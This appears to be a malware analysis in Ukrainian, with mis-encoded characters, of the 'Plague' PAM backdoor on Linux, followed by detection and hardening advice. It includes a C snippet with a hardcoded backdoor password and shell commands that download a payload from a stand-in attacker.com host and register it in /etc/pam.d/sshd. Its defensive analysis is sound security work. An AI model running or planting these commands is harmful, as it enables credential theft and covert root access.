# üîç –ê–Ω–∞–ª—ñ–∑ Plague PAM Backdoor Malware

## üîπ –©–æ —Ç–∞–∫–µ PAM —ñ —è–∫ –≤–æ–Ω–æ –ø—Ä–∞—Ü—é—î

PAM (Pluggable Authentication Modules) ‚Äî –º–æ–¥—É–ª—å–Ω–∞ —Å–∏—Å—Ç–µ–º–∞ –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –≤ Linux. –í–æ–Ω–∞ –∫–µ—Ä—É—î —Ç–∏–º, —è–∫ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ –≤—Ö–æ–¥—è—Ç—å —É —Å–∏—Å—Ç–µ–º—É —á–µ—Ä–µ–∑ SSH, sudo, login, gdm —Ç–æ—â–æ. –ö–æ–Ω—Ñ—ñ–≥–∏ –∑–Ω–∞—Ö–æ–¥—è—Ç—å—Å—è –≤ `/etc/pam.d/` —ñ –≤–∏–∫–ª–∏–∫–∞—é—Ç—å –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω—ñ `.so` –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏, —è–∫—ñ –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—é—Ç—å –∑–∞ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü—ñ—é.

---

## üîπ –Ø–∫ –ø—Ä–∞—Ü—é—î –±–µ–∫–¥–æ—Ä —á–µ—Ä–µ–∑ –ø—ñ–¥–º—ñ–Ω—É PAM –º–æ–¥—É–ª—è

Plague –∫–æ–ø—ñ—é—î—Ç—å—Å—è —è–∫ `libselinux.so.8` –≤ `/lib/x86_64-linux-gnu/` —ñ –ø—ñ–¥–∫–ª—é—á–∞—î—Ç—å—Å—è –¥–æ –æ–¥–Ω–æ–≥–æ –∑ —Ñ–∞–π–ª—ñ–≤ `/etc/pam.d/` —á–µ—Ä–µ–∑ —Ä—è–¥–æ–∫:

```
auth required /lib/x86_64-linux-gnu/libselinux.so.8
```

---

## üîπ –©–æ –≤—ñ–¥–±—É–≤–∞—î—Ç—å—Å—è –ø—ñ–¥ —á–∞—Å –ª–æ–≥—ñ–Ω—É

- –ö–æ—Ä–∏—Å—Ç—É–≤–∞—á –≤–≤–æ–¥–∏—Ç—å –ª–æ–≥—ñ–Ω/–ø–∞—Ä–æ–ª—å
- PAM –ø—ñ–¥–≤–∞–Ω—Ç–∞–∂—É—î –º–æ–¥—É–ª—å (Plague)
- –ú–æ–¥—É–ª—å –≤–∏–∫–æ–Ω—É—î —Å–≤—ñ–π –∫–æ–¥: –∫—Ä–∞–¥–µ –ª–æ–≥—ñ–Ω/–ø–∞—Ä–æ–ª—å, –¥–æ–∑–≤–æ–ª—è—î –≤—Ö—ñ–¥ —á–µ—Ä–µ–∑ —Ö–∞—Ä–¥–∫–æ–¥-–±–µ–∫–¥–æ—Ä
- –ù–µ –∑–∞–ª–∏—à–∞—î —Å–ª—ñ–¥—ñ–≤

---

## üîπ –¢–µ—Ö–Ω—ñ—á–Ω–∞ —Å—Ç—Ä—É–∫—Ç—É—Ä–∞ —Ñ–∞–ª—å—à–∏–≤–æ–≥–æ PAM-–º–æ–¥—É–ª—è

`pam_sm_authenticate()` –≤–∏–∫–æ–Ω—É—î:

1. –ó–±—ñ—Ä –ª–æ–≥—ñ–Ω–∞/–ø–∞—Ä–æ–ª—è
2. –õ–æ–≥—ñ–Ω —É —Ñ–∞–π–ª –∞–±–æ –≤—ñ–¥–ø—Ä–∞–≤–∫–∞
3. –ü–µ—Ä–µ–≤—ñ—Ä–∫–∞ –Ω–∞ –±–µ–∫–¥–æ—Ä-–ø–∞—Ä–æ–ª—å
4. –ü–æ–≤–µ—Ä–Ω–µ–Ω–Ω—è `PAM_SUCCESS`, —è–∫—â–æ –∑–Ω–∞–π–¥–µ–Ω–æ

```c
#define BACKDOOR_PASS "h4x0rplague"
if (strcmp(pass, BACKDOOR_PASS) == 0) return PAM_SUCCESS;
```

---

## üîπ –©–æ –¥–∞—î —Ç–∞–∫–∏–π –ø—ñ–¥—Ö—ñ–¥

- –ù–µ–≤–∏–¥–∏–º—ñ—Å—Ç—å (–≤–∏–≥–ª—è–¥–∞—î —è–∫ legit –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∞)
- Persistence (–∑–∞–ª–∏—à–∞—î—Ç—å—Å—è –ø—ñ—Å–ª—è –æ–Ω–æ–≤–ª–µ–Ω—å)
- –ö–æ–Ω—Ç—Ä–æ–ª—å –Ω–∞–¥ —É—Å—ñ–º–∞ –ª–æ–≥—ñ–Ω–∞–º–∏ (–≤–∫–ª—é—á–Ω–æ –∑ root)

---

## üîπ –ü—Ä–∏–∫–ª–∞–¥ –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è

```bash
curl -o /tmp/libselinux.so.8 http://attacker.com/pam.so
mv /tmp/libselinux.so.8 /lib/x86_64-linux-gnu/
echo "auth required /lib/x86_64-linux-gnu/libselinux.so.8" >> /etc/pam.d/sshd
```

---

## üîπ –ß–æ–º—É —Ü–µ –ø—Ä–∞—Ü—é—î 

- –°–∏–¥–∏—Ç—å –≤ —Å–µ—Ä—Ü—ñ —Å–∏—Å—Ç–µ–º–∏ (–∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—è)
- –ú–∞—î root-–ø—Ä–∞–≤–∞
- –ù–µ –≤–∏–¥–Ω–æ –≤ –ª–æ–≥–∞—Ö
- –í–∏–∂–∏–≤–∞—î –ø—ñ—Å–ª—è reboot/upgrade

---

## üîπ –Ø–∫ –≤–∏—è–≤–∏—Ç–∏ —Ç–∞ –∑–∞—Ö–∏—Å—Ç–∏—Ç–∏—Å—è

- –ü–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ `/etc/pam.d/*` –Ω–∞ —Å—Ç–æ—Ä–æ–Ω–Ω—ñ —Ä—è–¥–∫–∏
- –ö–æ–Ω—Ç—Ä–æ–ª—å —Ü—ñ–ª—ñ—Å–Ω–æ—Å—Ç—ñ –±—ñ–±–ª—ñ–æ—Ç–µ–∫ (`AIDE`, `sha256sum`)
- Auditd:

```bash
auditctl -w /lib/.../libselinux.so.8 -p war -k pam_integrity
```

- `chattr +i` –¥–ª—è –∫—Ä–∏—Ç–∏—á–Ω–∏—Ö —Ñ–∞–π–ª—ñ–≤

---

## üîπ –î–æ–¥–∞—Ç–∫–æ–≤—ñ –º–µ—Ç–æ–¥–∏ –ø–æ—à–∏—Ä–µ–Ω–Ω—è malware –Ω–∞ —Å–∏—Å—Ç–µ–º—É

### üî∏ 1. –ß–µ—Ä–µ–∑ RCE –∞–±–æ –≤—Ä–∞–∑–ª–∏–≤–∏–π —Å–µ—Ä–≤—ñ—Å:

- –ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –≤—ñ–¥–¥–∞–ª–µ–Ω—É –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, CVE-2021-3156, Dirty Pipe, PwnKit)
- –ó–∞–≤–∞–Ω—Ç–∞–∂—É—î –±–µ–∫–¥–æ—Ä:

```bash
curl -o /tmp/pam.so http://attacker.com/backdoor.so
```

- –ó–∞–º—ñ–Ω—é—î —Å–∏—Å—Ç–µ–º–Ω—É –±—ñ–±–ª—ñ–æ—Ç–µ–∫—É –∞–±–æ –¥–æ–¥–∞—î –Ω–æ–≤–∏–π –∑–∞–ø–∏—Å —É PAM:

```bash
mv /tmp/pam.so /lib/x86_64-linux-gnu/libselinux.so.8
```

### üî∏ 2. –ß–µ—Ä–µ–∑ –∑–ª–∞–º–∞–Ω—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ SSH:

- –Ø–∫—â–æ –ø–∞—Ä–æ–ª—å —Å–ª–∞–±–∫–∏–π –∞–±–æ –∑–ª–∏—Ç–∏–π ‚Äî –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –≤—Ö–æ–¥–∏—Ç—å —ñ –º–∞—î sudo-–¥–æ—Å—Ç—É–ø
- –î—ñ—ó —ñ–¥–µ–Ω—Ç–∏—á–Ω—ñ: –∫–æ–ø—ñ—é–≤–∞–Ω–Ω—è –º–æ–¥—É–ª—è, –¥–æ–¥–∞–≤–∞–Ω–Ω—è —Ä—è–¥–∫–∞ –≤ PAM

### üî∏ 3. –ß–µ—Ä–µ–∑ –∫–æ–º–ø—Ä–æ–º–µ—Ç–∞—Ü—ñ—é CI/CD –∞–±–æ –≤–Ω—É—Ç—Ä—ñ—à–Ω—ñ–π —Å–µ—Ä–≤–µ—Ä:

- –ë–µ–∫–¥–æ—Ä –≤–±—É–¥–æ–≤—É—î—Ç—å—Å—è –≤ –µ—Ç–∞–ø–∏ –¥–æ—Å—Ç–∞–≤–∫–∏ —á–µ—Ä–µ–∑ Jenkins/GitLab Runner
- –ü–æ—Ç—Ä–∞–ø–ª—è—î –≤ –ø—Ä–æ–¥–∞–∫—à–Ω —ñ–∑ –ø—Ä–∞–≤–∞–º–∏ root

### üî∏ 4. –ß–µ—Ä–µ–∑ —Ñ—ñ–∑–∏—á–Ω–∏–π –¥–æ—Å—Ç—É–ø –∞–±–æ —ñ–Ω—Å–∞–π–¥–µ—Ä–∞:

- –ü—ñ–¥ —á–∞—Å –æ–±—Å–ª—É–≥–æ–≤—É–≤–∞–Ω–Ω—è, –∞–±–æ —è–∫—â–æ –¥–∏—Å–∫ –º–æ–Ω—Ç—É—î—Ç—å—Å—è –≤ —ñ–Ω—à—É —Å–∏—Å—Ç–µ–º—É

---

## üîπ –Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏ –º–æ–Ω—ñ—Ç–æ—Ä–∏–Ω–≥—É —ñ –≤–∏—è–≤–ª–µ–Ω–Ω—è

- **AIDE / Tripwire** ‚Äî –ø–µ—Ä–µ–≤—ñ—Ä–∫–∞ —Ü—ñ–ª—ñ—Å–Ω–æ—Å—Ç—ñ —Ñ–∞–π–ª—ñ–≤
- **auditd** ‚Äî –º–æ–Ω—ñ—Ç–æ—Ä–∏–Ω–≥ –∑–º—ñ–Ω –¥–æ –∫—Ä–∏—Ç–∏—á–Ω–∏—Ö —Ñ–∞–π–ª—ñ–≤
- **osquery** ‚Äî —ñ–Ω–≤–µ–Ω—Ç–∞—Ä–∏–∑–∞—Ü—ñ—è —Å–∏—Å—Ç–µ–º–Ω–∏—Ö –±—ñ–±–ª—ñ–æ—Ç–µ–∫ —Ç–∞ PAM-–º–æ–¥—É–ª—ñ–≤
- **chkrootkit / rkhunter** ‚Äî –±–∞–∑–æ–≤–µ –≤–∏—è–≤–ª–µ–Ω–Ω—è —Ä—É—Ç–∫—ñ—Ç—ñ–≤

---

## üîπ –ê–≤—Ç–æ–º–∞—Ç–∏–∑–æ–≤–∞–Ω–∏–π —Å–∫—Ä–∏–ø—Ç –¥–ª—è –ø–æ—à—É–∫—É –∑–º—ñ–Ω —É PAM

```bash
#!/bin/bash
for file in /etc/pam.d/*; do
  echo "[+] –ê–Ω–∞–ª—ñ–∑ $file"
  grep -E '\.so|auth|session|password' "$file"
done

echo "\n[+] –ü–µ—Ä–µ–≤—ñ—Ä–∫–∞ libselinux.so.8"
sha256sum /lib/x86_64-linux-gnu/libselinux.so.8
```

---

## üîπ –†–µ–∫–æ–º–µ–Ω–¥–∞—Ü—ñ—ó

- –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π `AppArmor` –∞–±–æ `SELinux` –¥–ª—è –∫–æ–Ω—Ç—Ä–æ–ª—é –¥–æ—Å—Ç—É–ø—É –¥–æ PAM
- –°–ª—ñ–¥–∫—É–π –∑–∞ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω–∏–º–∏ —Å—É–º–∞–º–∏ –∫—Ä–∏—Ç–∏—á–Ω–∏—Ö –±—ñ–±–ª—ñ–æ—Ç–µ–∫
- –í—Å—Ç–∞–Ω–æ–≤–ª—é–π 2FA –¥–ª—è SSH
- –ü—Ä–æ–≤–æ–¥—å —Ä–µ–≥—É–ª—è—Ä–Ω–∏–π –∞—É–¥–∏—Ç PAM –∫–æ–Ω—Ñ—ñ–≥—ñ–≤
- –Ü–∑–æ–ª—é–π —Ç–∞ –º–æ–Ω—ñ—Ç–æ—Ä—å —Å–µ—Ä–≤–µ—Ä–∏ –∑ –ø—Ä–∞–≤–∞–º–∏ root –¥–æ—Å—Ç—É–ø—É

---

> ‚ö†Ô∏è **–£–≤–∞–≥–∞:** —Ü–µ–π –±–µ–∫–¥–æ—Ä –Ω–µ –¥–µ—Ç–µ–∫—Ç—É—î—Ç—å—Å—è –∑–≤–∏—á–∞–π–Ω–∏–º–∏ –∞–Ω—Ç–∏–≤—ñ—Ä—É—Å–∞–º–∏. –ü–æ–≤–µ–¥—ñ–Ω–∫–æ–≤–∏–π –∞–Ω–∞–ª—ñ–∑, –º–æ–Ω—ñ—Ç–æ—Ä–∏–Ω–≥ —Ü—ñ–ª—ñ—Å–Ω–æ—Å—Ç—ñ —Ç–∞ –∫–æ–Ω—Ç—Ä–æ–ª—å –Ω–∞–¥ PAM ‚Äî —î–¥–∏–Ω—ñ –Ω–∞–¥—ñ–π–Ω—ñ –º–µ—Ç–æ–¥–∏ –≤–∏—è–≤–ª–µ–Ω–Ω—è.

